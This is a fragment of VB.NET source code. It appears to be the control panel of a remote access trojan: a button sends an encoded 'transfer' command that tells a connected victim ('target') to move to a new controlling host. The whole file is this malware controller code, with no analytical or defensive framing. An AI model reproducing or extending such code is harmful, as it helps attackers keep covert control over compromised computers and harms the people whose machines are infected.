﻿Imports System.Security.Cryptography

Public Class tranfer
    Public user As USER
    Public F As Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            F.S.Send(user, F.ENB("transfer") & F.Y & F.ENB(TextBox1.Text) & F.Y & F.ENB(TextBox2.Text) & F.Y & TextBox3.Text & F.Y & F.ENB(TextBox4.Text))
            MsgBox("Traget Has Been Transfered to a New Host.", MsgBoxStyle.Information, "Done !")
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
End Class